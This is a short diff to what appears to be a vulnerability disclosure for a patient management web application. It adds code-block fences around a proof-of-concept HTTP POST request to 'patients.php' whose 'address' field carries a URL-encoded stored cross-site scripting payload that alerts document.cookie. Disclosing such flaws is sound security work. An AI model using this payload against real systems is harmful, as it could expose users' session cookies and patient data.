@@ -13,6 +13,7 @@ can result in the browser executing malicious code.
 #echo $patients->address;
 
 #PoC：
+```
 POST /pms/patients.php HTTP/1.1
 Host: 192.168.1.19
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
@@ -27,3 +28,4 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 160
 
 patient_name=1&address=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&cnic=1&date_of_birth=07%2F21%2F2022&phone_number=1&gender=Male&save_Patient=
+```
